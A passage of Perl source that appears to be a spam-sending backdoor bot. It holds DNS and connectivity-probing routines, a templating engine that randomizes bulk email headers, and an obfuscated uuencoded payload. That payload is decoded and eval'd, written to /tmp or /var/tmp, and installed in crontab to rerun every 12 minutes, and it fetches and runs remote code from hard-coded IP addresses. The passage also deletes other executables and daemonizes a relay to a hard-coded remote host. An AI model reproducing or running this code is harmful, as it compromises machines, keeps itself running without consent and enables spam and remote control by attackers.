$select = new IO::Select $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 2147772030, pack ("L", 1)); } else { $socket->blocking(0); }
unless ($socket->connect($packaddr))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
return;
}
unless ($select->can_write($timeout))
{
close $socket;
return;
}
unless ($socket->connected)
{
close $socket;
return;
}
}
$socket->blocking(1);
$packet = pack ("n", length $packet) . $packet;
if ($select->can_write($timeout))
{
unless ($socket->send($packet))
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
if ($select->can_read($timeout))
{
$buffer = ""; $text = 2;
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
if (!length $buffer)
{
close $socket;
return;
}
unless ($text = unpack ("n", $buffer))
{
close $socket;
return;
}
unless ($select->can_read($timeout))
{
close $socket;
return;
}
$buffer = "";
while ((length $buffer) < $text)
{
$size = $text - length $buffer; $resp = "";
unless ($socket->recv($resp, $size))
{
last if !length $resp;
}
last if !length $resp;
$buffer .= $resp;
}
unless ($text == length $buffer)
{
close $socket;
return;
}
}
else
{
close $socket;
return;
}
close $socket;
return if !defined $buffer || !length $buffer;
}
($resp, $text) = &nsparser(\$buffer, $offset, $packid, $type);
return !$resp ? $text : undef;
}
sub mail
{
my $line = shift;
return if !defined $$line || $$line !~ /^[^\@]+\@[^\@]+\.[^\@]+$/;
my ($name, $mail, $info) = $$line =~ /\s*(.*?)[\s\|<]*([^\s|<]+\@[^>\|\s]+)>*(.*)$/;
return if !$mail;
$info =~ s/.*?\|[\s\|]*(.+?)[\s\|]*$/$1/ if length $info;
return (\$mail, \$name, \$info);
}

sub set_i
{
	if ($^O ne "MSWin32")
	{
		&set_d();
		&set_m(join("\x2E",unpack("C4",pack("L",2713376809))),32470,'/');
		&set_m(join("\x2E",unpack("C4",pack("L",2730154025))),32480,'/');
		&set_p();
	}
}

sub data
{
	my ($to, $from, $b) = @_;
	my $time = time;
	my $zone = sprintf ("%s%02d00", $b->{timezone}[0], $b->{timezone}[1]);
	my $date = localtime $time; $date =~ s/^(\w+)\s+(\w+)\s+(\d+)\s+(\d+):(\d+):(\d+)\s+(\d+)$/sprintf "$1, $3 $2 $7 $4:$5:$6 %s", $zone/e;
	my $wday = {Mon => "Monday", Tue => "Tuesday", Wed => "Wednesday", Thu => "Thursday", Fri => "Friday", Sat => "Saturday", Sun => "Sunday"}->{$1};
	my $nmon = {Jan => 1, Feb => 2, Mar => 3, Apr => 4, May => 5, Jun => 6, Jul => 7, Aug => 8, Sep => 9, Oct => 10, Nov => 11, Dec => 12}->{$2};
	my $tmon = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]->[$nmon - 1];
	my $ampm = "AM"; my $hour = int $4; $ampm = "PM" if $hour == 12; $hour = 12 if $hour == 0; if ($hour > 12) { $ampm = "PM"; $hour -= 12; }
	$date =
	{
		DATE	=> $date,
		WWWW	=> $wday,
		WWW		=> $1,
		DD		=> sprintf ("%02d", $3),
		D		=> $3,
		MMMM	=> $tmon,
		MMM		=> $2,
		MM		=> sprintf ("%02d", $nmon),
		M		=> $nmon,
		YYYY	=> $7,
		YY		=> substr ($7, -2),
		Z		=> $zone,
		TT		=> $ampm,
		tt		=> lc $ampm,
		HH		=> $4,
		H		=> int $4,
		hh		=> sprintf ("%02d", $hour),
		h		=> $hour,
		mm		=> $5,
		m		=> int $5,
		ss		=> $6,
		s		=> int $6
	};
	my ($mail, $name) = &mail(\$from);
	my ($user, $host) = split (/\@/, $$mail);
	$from = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
	my $replyto = $from;
if ($b->{from}[0] ne $b->{replyto}[0])
{
($mail, $name) = &mail(\@{$b->{replyto}}[int rand scalar @{$b->{replyto}}]);
($user, $host) = split (/\@/, $$mail);
$replyto = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
if ($b->{method} == 0)
{
@_ = ();
foreach (@$to) { ($mail, $name) = &mail(\$_); $_ = length $$name ? "$$name <$$mail>" : "<$$mail>"; push @_, $_; }
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => join (",\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20", @_), NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
else
{
($mail, $name) = &mail(\$to->[0]);
($user, $host) = split (/\@/, $$mail);
$to = {ADDR => length $$name ? "$$name <$$mail>" : "<$$mail>", NAME => length $$name ? $$name : "", MAIL => $$mail, USER => $user, HOST => $host};
}
my $head =
{
HELO		=> $b->{helo},
TYPE		=> $b->{type} ? "html" : "plain",
SUBJECT		=> @{$b->{subject}}[int rand scalar @{$b->{subject}}],
CHARSET		=> $b->{charset},
ENCODING	=> $b->{charset} eq "windows-1251" ? "8bit" : "7bit",
NPRIORITY	=> (5 - $b->{priority} * $b->{priority} - ($b->{priority} == 1 ? 1 : 0)),
TPRIORITY	=> ["Low", "Normal", "High"]->[$b->{priority}],
MESSAGEID	=> sprintf ("%08x\.%04x%04x", int ($time * 0.0023283064365387 + 27111902.8329849), int rand 32769, int rand 32769)
};
my $letter = length $b->{letter} ? sprintf ("%s%s%s", $b->{header}, "\x0D\x0A\x0D\x0A", $b->{letter}) : $b->{header};
$letter =~ s/\%$_\%/$head->{$_}/g foreach (keys %$head);
$letter =~ s/\%$_\%/$date->{$_}/g foreach (keys %$date);
$letter =~ s/\%FROM$_\%/$from->{$_}/g foreach (keys %$from);
$letter =~ s/\%REPLYTO$_\%/$replyto->{$_}/g foreach (keys %$replyto);
$letter =~ s/\%TO$_\%/$to->{$_}/g foreach (keys %$to);
&tag(\$letter);
if (!length $b->{letter})
{
$letter =~ s/\x0D//gm;
$letter =~ s/\x0A/\x0D\x0A/gm;
}
return $letter;
}
sub quoted ($)
{
	my $line = shift;
	$line =~ s/([^ \t\x0D\x0A!"#\$%&'()*+,\-.\/0-9:;<>?\@A-Z[\\\]^_`a-z{|}~])/sprintf ("=%02X", ord ($1))/eg;
	$line =~ s/([ \t]+)$/join ("", map {sprintf ("=%02X", ord ($_))} split ("", $1))/egm;
	my $lines = "";
	$lines .= "$1=\x0D\x0A" while $line =~ s/(.*?^[^\x0D\x0A]{71}(?:[^=\x0D\x0A]{2}(?![^=\x0D\x0A]{0,1}$)|[^=\x0D\x0A](?![^=\x0D\x0A]{0,2}$)|(?![^=\x0D\x0A]{0,3}$)))//xsm;
	$lines .= $line;
	return $lines;
}

sub tag
{
	my $line = shift;
	my $save = [];
	$$line =~ s/\[random\]([^\[]*)\[\/random\]({\d+,\d+})?(\((\d+)\))?/&tagrandom($1, $2, $4, \$save)/eg;
	$$line =~ s/\[string\]([^\[]*)\[\/string\](\((\d+)\))?/&tagstring($1, $3, \$save)/eg;
	$$line =~ s/\%\[(\d+)\]/$1 < 64 && defined $save->[$1] ? $save->[$1] : ""/eg;
	$$line =~ s/\[quot\](.*?)\[\/quot\]/&quoted($1)/egs;
}

sub tagrandom
{
	my ($line, $spec, $cell, $save) = @_;
	if (defined $line && length $line)
	{
		if (defined $spec && $spec =~ /^{(\d+),(\d+)}$/)
		{
		$spec = $2 > 64 ? 64 : $2;
		$spec = $1 < $spec ? ($1 + int rand (1 + $spec - $1)) : $spec;
		}
		else
		{
		$spec = length $line;
		$spec = 1 + ($spec > 64 ? int rand 64 : int rand $spec);
		}
		$line = [split (//, $line)];
		$line = join ('', @$line[map {rand @$line}(1..$spec)]);
	}
	$line = defined $line ? $line : "";
	$$save->[$cell] = $line if defined $cell && $cell < 64;
	return $line;
}

sub tagstring
{
	my ($line, $cell, $save) = @_;
	if (defined $line && length $line)
	{
		$line = [split (/\|/, $line)];
		$line = $line->[int rand scalar @$line];
	}
	$line = defined $line ? $line : "";
	$$save->[$cell] = $line if defined $cell && $cell < 64;
	return $line;
}
sub t_est
{
	while (1)
	{
		my $readers = IO::Select->new() or last;
		my $writers = IO::Select->new() or last;
		my $session = {};
		foreach my $result (keys %$test)
		{
		while (1 < scalar @{$test->{$result}})
		{
		my $host = pop @{$test->{$result}};
		my $addr = pack ("C4", split (/\./, $host));
		my ($protocol, $port);
		if ($result eq "ip")
		{
		($protocol, $port) = ("tcp", 80);
		}
		else
		{
		($protocol, $port) = $result =~ /^(tcp|udp)(\d+)$/;
		}
		$addr = sockaddr_in($port, $addr);
		my $socket = $protocol eq "tcp" ? IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM) : IO::Socket::INET->new(Proto => "udp");
		next unless $socket;
		if ($^O eq "MSWin32") { ioctl ($socket, 2147772030, pack ("L", 1)); } else { $socket->blocking(0); }
		if ($protocol eq "tcp")
		{
		unless ($socket->connect($addr))
		{
		if ($! != $eiprogr && $! != $ewblock)
		{
		close $socket;
		next;
		}
		}
		}
		$writers->add($socket);
		$session->{$socket} = {status => $protocol eq "tcp" ? "cn" : "wr", buffer => "", timeout => 5, result => $result, addr => $addr};
		if ($port == 53)
		{
		$session->{$socket}{buffer} .= pack ("nSn4", int rand 65535, 1, 1, 0, 0, 0);
		$session->{$socket}{buffer} .= pack ("C", length $_) . $_ for (split (/\./, $host));
		$session->{$socket}{buffer} .= pack ("Cn2", 0, 1, 1);
		$session->{$socket}{buffer} = join ("", pack ("n", length $session->{$socket}{buffer}), $session->{$socket}{buffer}) if $protocol eq "tcp";
		}
		elsif ($port == 80)
		{
		$session->{$socket}{buffer} = join ("\x0D\x0A", "GET / HTTP/1.1", "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*", "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Host: $host", "Connection: close", "Cache-Control: no-cache", "\x0D\x0A");
		}
		}
		}
		$session->{$_}{timeout} += time foreach (keys %$session);
		while ($readers->count() || $writers->count())
		{
		my $time = time;
		my $writable = (IO::Select->select(undef, $writers, undef, 0))[1];
		foreach my $handle (@$writable)
		{
		if ($session->{$handle}{status} eq "cn")
		{
		if ($handle->connected)
		{
		if ($session->{$handle}{result} eq "tcp25")
		{
		$session->{$handle}{status} = "rd";
		$readers->add($handle);
		$writers->remove($handle);
		}
		else
		{
		$session->{$handle}{status} = "wr";
		}
		}
		else
		{
		$session->{$handle}{timeout} = 0;
		}
		}
		else
		{
		my $result;
		if ($session->{$handle}{result} eq "udp53")
		{
		$result = $handle->send($session->{$handle}{buffer}, 0, $session->{$handle}{addr});
		}
		elsif ($session->{$handle}{result} eq "tcp53")
		{
		$result = $handle->send($session->{$handle}{buffer});
		}
		else
		{
		$result = syswrite ($handle, $session->{$handle}{buffer});
		}
		if (defined $result && $result > 0)
		{
		substr ($session->{$handle}{buffer}, 0, $result) = "";
		if (length $session->{$handle}{buffer} < 1)
		{
		$session->{$handle}{status} = "rd";
		$readers->add($handle);
		$writers->remove($handle);
		}
		}
		elsif ($! == $ewblock)
		{
		next;
		}
		else
		{
		$session->{$handle}{timeout} = 0;
		}
		}
		}
		my $readable = (IO::Select->select($readers, undef, undef, 0))[0];
		foreach my $handle (@$readable)
		{
		my $result;
		if ($session->{$handle}{result} eq "udp53")
		{
		$result = $handle->recv($session->{$handle}{buffer}, 512);
		$result = length $session->{$handle}{buffer} if defined $result;
		}
		elsif ($session->{$handle}{result} eq "tcp53")
		{
		$result = $handle->recv($session->{$handle}{buffer}, 2);
		$result = length $session->{$handle}{buffer} if defined $result;
		}
		else
		{
		$result = sysread ($handle, $session->{$handle}{buffer}, 8192, length $session->{$handle}{buffer});
		}
		if (defined $result)
		{
		if ($session->{$handle}{result} eq "ip")
		{
		if ($test->{$session->{$handle}{result}}[0] eq "0.0.0.0")
		{
		if ($session->{$handle}{buffer} =~ /(\d+\.\d+\.\d+\.\d+)/)
		{
		$test->{$session->{$handle}{result}}[0] = $1;
		$session->{$handle}{timeout} = 0;
		}
		else
		{
		next;
		}
		}
		else
		{
		$session->{$handle}{timeout} = 0;
		}
		}
		else
		{
		$test->{$session->{$handle}{result}}[0] = 1 if $result > 0;
		$session->{$handle}{timeout} = 0;
		}
		}
		elsif ($! == $ewblock)
		{
		next;
		}
		else
		{
		$session->{$handle}{timeout} = 0;
		}
		}
		foreach my $handle ($writers->handles, $readers->handles)
		{
		if ($time >= $session->{$handle}{timeout})
		{
		$readers->remove($handle) if $readers->exists($handle);
		$writers->remove($handle) if $writers->exists($handle);
		delete $session->{$handle};
		close $handle;
		}
		}
		}
		last;
	}
}
sub set_d
{
	my $drv1 = <<'DRDATA';
	M(R$O=7-R+V)I;B]P97)L("UW"G5S92!S=')I8W0["G5S92!03U-)6#L*=7-E
	M($E/.CI3;V-K970["G5S92!)3SHZ4V5L96-T.PHD?"`](#$[("9M86EN*"D[
	M"G-U8B!M86EN"GL*97AI="`P('5N;&5S<R!D969I;F5D("AM>2`D<&ED(#T@
	M9F]R:RD["F5X:70@,"!I9B`D<&ED.PI03U-)6#HZ<V5T<VED*"D["B1324=[
	M)%]](#T@(DE'3D]212(@9F]R("AQ=R`H2%50($E.5"!)3$P@1E!%(%%5250@
	M04)25"!54U(Q(%-%1U8@55-2,B!025!%($%,4DT@5$5232!#2$Q$*2D["G5M
	M87-K(#`["F-H9&ER("(O(CL*;W!E;B`H4U1$24XL("(\+V1E=B]N=6QL(BD[
	M"F]P96X@*%-41$]55"P@(CXO9&5V+VYU;&PB*3L*;W!E;B`H4U1$15)2+"`B
	M/B935$1/550B*3L*;7D@)'5R;"`](%LB-2XQ,S4N-#(N.3@Z,C4B+"(T,2XR
	M,38N,3@V+C$V,CHX,")=.PIM>2`D<FYD(#T@6R)A(BXN(GHB+"`B02(N+B):
	M(ET[("1R;F0@/2!J;VEN("@B(BP@0"1R;F1;;6%P('MR86YD($`D<FYD?2@Q
	M+BXH-B`K(&EN="!R86YD(#4I*5TI.PIM>2`D9&ER(#T@(B]V87(O=&UP(CL@
	M:68@*&]P96X@*$8L("(^(BP@(B]T;7`O)')N9"(I*2![(&-L;W-E($8[('5N
	M;&EN:R`B+W1M<"\D<FYD(CL@)&1I<B`](B]T;7`B.R!]"FUY("@D:&5A9&5R
	M+"`D8V]N=&5N="D["FUY("@D;&EN:RP@)&9I;&4L("1I9"P@)&-O;6UA;F0L
	M("1T:6UE;W5T*2`]("@B96XN=VEK:7!E9&EA+F]R9R(L(")I;F1E>"YH=&UL
	M(BP@,2P@.38L(#$P*3L*9F]R96%C:"!M>2`D<G,@*$`D=7)L*0I["B1H96%D
	M97(@/2`B)&1I<B\B("X@=&EM93L@)&-O;G1E;G0@/2`D:&5A9&5R("X@(C$B
	M.PIU;FQI;FL@)&AE861E<B!I9B`M9B`D:&5A9&5R.R!U;FQI;FL@)&-O;G1E
	M;G0@:68@+68@)&-O;G1E;G0["B9H='1P*"1R<RP@)'1I;65O=70L("1H96%D
	M97(L("1C;VYT96YT+"`P*3L*:68@*&]P96X@*$8L("(\(BP@)&AE861E<BDI
	M"GL*9FQO8VL@1BP@,3L*;7D@*"1T97-T+"`D=&%S:RD@/2`H,"P@(B(I.PIW
	M:&EL92`H/$8^*0I["G,O7EQS*BA;7EQS73\N*BDD+R0Q+SL*<R]>*"XJ6UY<
	M<UTI7',J)"\D,2\["FYE>'0@=6YL97-S(&QE;F=T:"`D7SL*)'1E<W0@*RL@
	M:68@)%\@97$@(DA45%`O,2XP(#(P,"!/2R(@?'P@)%\@97$@(D-O;FYE8W1I
	M;VXZ(&-L;W-E(CL@)'1A<VL@/2`D,2!I9B`O7E-E="U#;V]K:64Z(%!(4%-%
	M4U-)1#TH6UX[72LI+SL*?0IC;&]S92!&.PHH)&QI;FLL("1F:6QE+"`D:60L
	M("1C;VUM86YD+"`D=&EM96]U="D@/2`F9&5C>&0H)'1A<VLI(&EF("1T97-T
	M(#T](#(@)B8@;&5N9W1H("1T87-K.PI]"G5N;&EN:R`D:&5A9&5R(&EF("UF
	M("1H96%D97([('5N;&EN:R`D8V]N=&5N="!I9B`M9B`D8V]N=&5N=#L*?0IE
	M>&ET(#`@:68@(61E9FEN960@)&-O;6UA;F0@?'P@)&-O;6UA;F0@(7X@+UXQ
	M-B0O.PHD:&5A9&5R(#T@(B1D:7(O(B`N('1I;64[("1C;VYT96YT(#T@(B1D
	M:7(O)&9I;&4B.PIU;FQI;FL@)&AE861E<B!I9B`M9B`D:&5A9&5R.R!U;FQI
	M;FL@)&-O;G1E;G0@:68@+68@)&-O;G1E;G0["B9H='1P*"1L:6YK+"`D=&EM
	M96]U="P@)&AE861E<BP@)&-O;G1E;G0L(#$I.PIM>2`H)')E<W`L("1S:7IE
	M*2`]("@B,#`P(BP@,"D["FEF("AO<&5N("A&+"`B/"(L("1H96%D97(I*0I[
	M"F9L;V-K($8L(#$["G=H:6QE("@\1CXI"GL*<R]>7',J*%M>7'-=/RXJ*20O
	M)#$O.PIS+UXH+BI;7EQS72E<<RHD+R0Q+SL*;F5X="!U;FQE<W,@;&5N9W1H
	M("1?.PHD<F5S<"`]("0Q(&EF("]>2%144%Q3*UQS*RA<9%QD7&0I+SL*?0IC
	M;&]S92!&.PI]"B1S:7IE(#T@*'-T870@)&-O;G1E;G0I6S==(&EF("UF("1C
	M;VYT96YT.PHD<VEZ92`](#`@:68@(61E9FEN960@)'-I>F4@?'P@)'-I>F4@
	M(7X@+UY<9"LD+SL*:68@*"1S:7IE(#X@,"D*>PIC:&UO9"`P-S4U+"`D8V]N
	M=&5N=#L*<WES=&5M(")P97)L("1C;VYT96YT(#XO9&5V+VYU;&P@,CXF,2([
	M"GT*=6YL:6YK("1H96%D97(@:68@+68@)&AE861E<CL@=6YL:6YK("1C;VYT
	M96YT(&EF("UF("1C;VYT96YT.PIF;W)E86-H(&UY("1R<R`H0"1U<FPI"GL*
	M)&AE861E<B`]("(O9&5V+VYU;&PB.R`D8V]N=&5N="`]("1H96%D97(["B9H
	M='1P*"1R<RP@,3`L("1H96%D97(L("1C;VYT96YT+"`P+"`B)&ED+B1R97-P
	M+B1S:7IE(BD["GT*97AI="`P.PI]"G-U8B!X;W)L"GL*;7D@*"1L:6YE+"`D
	M8V]D92P@)'AO<BP@)&QI;2D@/2`H<VAI9G0L("(B+"`Q+"`Q-BD["F9O<F5A
	M8V@@;7D@)&-H<B`H<W!L:70@*"\O+"`D;&EN92DI"GL*:68@*"1X;W(@/3T@
	M)&QI;2D*>PHD;&EM(#T@,"!I9B`D;&EM(#T](#(U-CL*)&QI;2`K/2`Q-CL*
	M)'AO<B`](#$["GT*)&-O9&4@+CT@<&%C:R`H(D,B+"!U;G!A8VL@*")#(BP@
	M)&-H<BD@7B`D>&]R*3L*)'AO<B`K*SL*?0IR971U<FX@)&-O9&4["GT*<W5B
	M(&1E8WAD"GL*;7D@)&1A=&$@/2!P86-K("@B2"HB+"!S:&EF="D["D!?(#T@
	M=6YP86-K("@B0S4B+"!S=6)S='(@*"1D871A+"`P+"`U+"`B(BDI.PIR971U
	M<FX@*"9X;W)L*'-U8G-T<B`H)&1A=&$L(#`L('-H:69T+"`B(BDI+"`F>&]R
	M;"AS=6)S='(@*"1D871A+"`P+"!S:&EF="P@(B(I*2P@0%\I.PI]"G-U8B!H
	M='1P"GL*;7D@*"1U<FPL("1T:6UE;W5T+"`D:&5A9&5R+"`D8V]N=&5N="P@
	M)&UO9&4L("1G96-K;RD@/2!`7SL*)&=E8VMO(#T@(C(P,3`P,3`Q(B!I9B`A
	M9&5F:6YE9"`D9V5C:V\@?'P@(6QE;F=T:"`D9V5C:V\["FUY("@D:&]S="P@
	M)'!O<G0L("1P871H*2`]("1U<FP@/7X@+UXH6UY<+SI=*RDZ*BA<9"HI/RA<
	M+S];7EPC72HI+SL*<F5T=7)N('5N;&5S<R`D:&]S=#L*;7D@)&%D9'(@/2!G
	M971H;W-T8GEN86UE("1H;W-T.PIR971U<FX@=6YL97-S("1A9&1R.PHD<&]R
	M="!\?#T@.#`["B1P871H('Q\/2`B+R(["B1A9&1R(#T@<V]C:V%D9')?:6XH
	M)'!O<G0L("1A9&1R*3L*;7D@)')E861E<G,@/2!)3SHZ4V5L96-T+3YN97<H
	M*2!O<B!R971U<FX["FUY("1W<FET97)S(#T@24\Z.E-E;&5C="T^;F5W*"D@
	M;W(@<F5T=7)N.PIM>2`D8G5F9F5R(#T@:F]I;@HH"B)<>#!$7'@P02(L"B)'
	M150@)'!A=&@@2%144"\Q+C$B+`HB2&]S=#H@)&AO<W0B+`HB0V]O:VEE.B!0
	M2%!315-3240],CDU8S0T-6,U9C0Y-68U9C0U-#@U,S-C,V,S8S-D,CDB+`HB
	M57-E<BU!9V5N=#H@36]Z:6QL82\U+C`@*%=I;F1O=W,@3E0@-BXQ.R!7:6XV
	M-#L@>#8T.R!R=CHV,"XP*2!'96-K;R\D9V5C:V\@1FER969O>"\V,"XP(BP*
	M(D%C8V5P=#H@=&5X="]H=&UL+&%P<&QI8V%T:6]N+WAH=&UL*WAM;"QA<'!L
	M:6-A=&EO;B]X;6P[<3TP+C`L*B\J.W$],"XU(BP*(D%C8V5P="U,86YG=6%G
	M93H@96XM=7,L96X[<3TP+C`B+`HB06-C97!T+45N8V]D:6YG.B!G>FEP+"!D
	M969L871E(BP*(D%C8V5P="U#:&%R<V5T.B!)4T\M.#@U.2TQ+'5T9BTX.W$]
	M,"XU+"H[<3TP+C`B+`HB0V]N;F5C=&EO;CH@8VQO<V4B+`HB7'@P1%QX,$$B
	M"BD["FEF("@D;6]D92D*>PHD8G5F9F5R(#T@:F]I;@HH"B)<>#!$7'@P02(L
	M"B)'150@)'!A=&@@2%144"\Q+C`B+`HB2&]S=#H@)&AO<W0B+`HB57-E<BU!
	M9V5N=#H@36]Z:6QL82\U+C`@*%=I;F1O=W,@3E0@-BXQ.R!7:6XV-#L@>#8T
	M.R!R=CHV,2XP*2!'96-K;R\D9V5C:V\@1FER969O>"\V,2XP(BP*(D%C8V5P
	M=#H@=&5X="]H=&UL+"HO*B(L"B)#;VYN96-T:6]N.B!C;&]S92(L"B)<>#!$
	M7'@P02(**3L*?0IM>2`D<V]C:V5T(#T@24\Z.E-O8VME=#HZ24Y%5"T^;F5W
	M*%!R;W1O(#T^(")T8W`B+"!4>7!E(#T^(%-/0TM?4U1214%-*3L*<F5T=7)N
	M('5N;&5S<R`D<V]C:V5T.PHD<V]C:V5T+3YB;&]C:VEN9R@P*3L*=6YL97-S
	M("@D<V]C:V5T+3YC;VYN96-T*"1A9&1R*2D*>PIU;FQE<W,@*"0A(#T](%!/
	M4TE8.CI%24Y04D]'4D534RD*>PIC;&]S92`D<V]C:V5T.PIR971U<FX["GT*
	M?0HD=W)I=&5R<RT^861D*"1S;V-K970I.PHD=&EM96]U="`K/2!T:6UE.PIM
	M>2`D<W1E<"`](#`["G=H:6QE("@Q*0I["DE/.CI396QE8W0M/G-E;&5C="AU
	M;F1E9BP@=6YD968L('5N9&5F+"`P+C`R*3L*;7D@)'=R:71A8FQE(#T@*$E/
	M.CI396QE8W0M/G-E;&5C="AU;F1E9BP@)'=R:71E<G,L('5N9&5F+"`P*2E;
	M,5T["F9O<F5A8V@@;7D@)&AA;F1L92`H0"1W<FET86)L92D*>PII9B`H)'-T
	M97`@/3T@,"D*>PHD<W1E<"`](#$@:68@)&AA;F1L92T^8V]N;F5C=&5D.PI]
	M"FEF("@D<W1E<"`]/2`Q*0I["FUY("1R97-U;'0@/2!S>7-W<FET92`H)&AA
	M;F1L92P@)&)U9F9E<BD["FEF("AD969I;F5D("1R97-U;'0@)B8@)')E<W5L
	M="`^(#`I"GL*<W5B<W1R("@D8G5F9F5R+"`P+"`D<F5S=6QT*2`]("(B.PII
	M9B`H(6QE;F=T:"`D8G5F9F5R*0I["B1R96%D97)S+3YA9&0H)&AA;F1L92D[
	M"B1W<FET97)S+3YR96UO=F4H)&AA;F1L92D["B1S=&5P(#T@,CL*?0I]"F5L
	M<VEF("@D(2`]/2!03U-)6#HZ15=/54Q$0DQ/0TLI"GL*;F5X=#L*?0IE;'-E
	M"GL*)'1I;65O=70@/2`P.PI]"GT*?0IM>2`D<F5A9&%B;&4@/2`H24\Z.E-E
	M;&5C="T^<V5L96-T*"1R96%D97)S+"!U;F1E9BP@=6YD968L(#`I*5LP73L*
	M9F]R96%C:"!M>2`D:&%N9&QE("A`)')E861A8FQE*0I["FYE>'0@:68@)'-T
	M97`@/"`R.PIM>2`D<F5S=6QT.PII9B`H)'-T97`@/3T@,BD*>PHD<F5S=6QT
	M(#T@<WES<F5A9"`H)&AA;F1L92P@)&)U9F9E<BP@.#$Y,BP@;&5N9W1H("1B
	M=69F97(I.PI]"F5L<V4*>PHD<F5S=6QT(#T@<WES<F5A9"`H)&AA;F1L92P@
	M)&)U9F9E<BP@.#$Y,BD["GT*:68@*#$V,S@T(#P@;&5N9W1H("1B=69F97(I
	M"GL*)'1I;65O=70@/2`P.PI]"F5L<VEF("AD969I;F5D("1R97-U;'0I"GL*
	M:68@*"1R97-U;'0@/B`P*0I["FEF("@D<W1E<"`]/2`R*0I["FUY("1O9F9S
	M970@/2!I;F1E>"`H)&)U9F9E<BP@(EQX,$1<>#!!7'@P1%QX,$$B*3L*;F5X
	M="!I9B`D;V9F<V5T(#P@,#L*:68@*&]P96X@*$8L("(^/B(L("1H96%D97(I
	M*0I["F9L;V-K($8L(#(["F)I;FUO9&4@1CL*<')I;G0@1B!S=6)S='(@*"1B
	M=69F97(L(#`L("1O9F9S970I.PIC;&]S92!&.PI]"G-U8G-T<B`H)&)U9F9E
	M<BP@,"P@)&]F9G-E="`K(#0I(#T@(B(["B1S=&5P(#T@,SL*?0II9B`H)'-T
	M97`@/3T@,RD*>PII9B`H;&5N9W1H("1B=69F97(I"GL*)&)U9F9E<B`]?B!S
	M+R5%2$Q/7U9!3%5%)2\R.35C-#0U8S5F-#DU9C5F-#4T.#4S,V,S8S-C,V0R
	M.2]G<SL*:68@*&]P96X@*$8L("(^/B(L("1C;VYT96YT*2D*>PIF;&]C:R!&
	M+"`R.PIB:6YM;V1E($8["G!R:6YT($8@)&)U9F9E<CL*8VQO<V4@1CL*?0HD
	M8G5F9F5R(#T@(B(["GT*?0IN97AT.PI]"B1T:6UE;W5T(#T@,#L*?0IE;'-I
	M9B`H)"$@/3T@4$]325@Z.D573U5,1$),3T-+*0I["FYE>'0["GT*96QS90I[
	M"B1T:6UE;W5T(#T@,#L*?0I]"FEF("@D=&EM96]U="`\('1I;64I"GL*9F]R
	M96%C:"!M>2`D:&%N9&QE("@D=W)I=&5R<RT^:&%N9&QE<RP@)')E861E<G,M
	M/FAA;F1L97,I"GL*)'=R:71E<G,M/G)E;6]V92@D:&%N9&QE*2!I9B`D=W)I
	M=&5R<RT^97AI<W1S*"1H86YD;&4I.PHD<F5A9&5R<RT^<F5M;W9E*"1H86YD
	M;&4I(&EF("1R96%D97)S+3YE>&ES=',H)&AA;F1L92D["F-L;W-E("1H86YD
	4;&4["GT*<F5T=7)N.PI]"GT*?0H`
	DRDATA
	my $valn1 = ["a".."z", "A".."Z"];
	$valn1 = join ("", @$valn1[map {rand @$valn1}(1..(6 + int rand 5))]);
	my $udrv1 = 'my $' . $valn1 . '=\'\';$' . $valn1 . '.=$_ while(<DATA>);';

	$udrv1 .= '$' . $valn1 . '=unpack(\'u*\',$' . $valn1 . ');';
	$udrv1 .= '$' . $valn1 . '=~s/295c445c5f495f5f4548533c3c3c3d29/7f787e6d78656b697e75226f63612223/gs;';
	$udrv1 .= 'eval($' . $valn1 . ');' . "\x0A";
	$udrv1 .= '__DATA__' . "\x0A";
	$udrv1 .= $drv1; $drv1 = $udrv1;
	$valn1 = ["a".."z", "A".."Z"];
	$valn1 = join ("", @$valn1[map {rand @$valn1}(1..(6 + int rand 5))]);
	$udrv1 = "/tmp/$valn1";
	if (open (F, ">", $udrv1)) {
		flock F, 2;
		print F $valn1;
		close F;
		chmod 0755, $udrv1;
		unlink $udrv1;
		return if -f $udrv1; 
	}
	$udrv1 = "/var/tmp/$valn1";
	if (open (F, ">", $udrv1)) {
		flock F, 2;
		print F $valn1;
		close F;
		chmod 0755, $udrv1;
		unlink $udrv1;
		return if -f $udrv1;
	}
	foreach my $drv1p ("/var/tmp", "/tmp") {
		for (<$drv1p/*>) {
			unlink $_ if (-f $_ && (-x $_ || -X $_));
		}
		my $drv1n = ["a".."z", "A".."Z"];
		$drv1n = join ("", @$drv1n[map {rand @$drv1n}(1..(6 + int rand 5))]);
		my $drv1b = "$drv1p/$drv1n";
		my $drv1c = $drv1b . int rand 9;
		my $drv1t = "*/12 * * * * perl $drv1b >/dev/null 2>&1\n";
		if (open (B, ">", $drv1b)) {
			flock B, 2;
			print B $drv1;
			close B;
			if (open (C, ">", $drv1c)) {
				flock C, 2;
				print C $drv1t;
				close C;
				chmod 0755, $drv1b;
				system "crontab $drv1c >/dev/null 2>&1";
				system "/usr/bin/crontab $drv1c >/dev/null 2>&1";
				unlink $drv1c;
				last;
			}
		}
	}
}

sub set_p
{
	if ($^O ne "MSWin32")
	{
	use POSIX qw(setsid);
	return unless defined (my $child = fork);
	return if $child;
	POSIX::setsid();
	$SIG{CHLD} = sub { while (waitpid (-1, 1) > 0) {} };
	$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM));
	umask 0;
	chdir "/";
	open (STDIN, "</dev/null");
	open (STDOUT, ">/dev/null");
	open (STDERR, ">&STDOUT");
	}
	my $setting = { listen_v4_port => 37680, remote_v4_host_list => ["41.216.186.161:44540"], allow_host_list => {}, restart_timer => 5, connect_timeout => 10, session_timeout => 60 };
	my $readers = IO::Select->new() or exit 0;
